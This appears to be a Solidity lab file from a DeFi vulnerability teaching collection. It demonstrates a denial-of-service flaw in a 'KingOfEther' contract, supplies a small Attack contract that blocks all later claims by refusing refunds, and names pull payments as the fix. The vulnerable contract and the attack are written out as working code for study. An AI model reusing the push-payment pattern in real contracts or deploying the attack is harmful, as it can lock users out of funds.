// SPDX-License-Identifier: MIT
// Source: https://github.com/SunWeb3Sec/DeFiVulnLabs
// Vulnerability: Denial of Service
pragma solidity ^0.8.18;

/*
Name: Denial of Service

Description:
The KingOfEther contract holds a game where a user can claim the throne by sending
more Ether than the current balance. The contract attempts to return the previous
balance to the last "king" when a new user sends more Ether. However, an attacker's
contract can become the king and make the fallback function revert, causing the
claimThrone function to fail for all future attempts.

Mitigation:
Use a Pull payment pattern - enable users to withdraw their Ether instead of sending it to them.
*/

contract KingOfEther {
    address public king;
    uint public balance;

    // VULNERABILITY: Pushes payment which can be blocked
    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more to become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "Failed to send Ether");

        balance = msg.value;
        king = msg.sender;
    }
}

// Attack contract that causes DoS
contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }

    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }

    // No receive function - will revert on receiving ETH, blocking new kings
}
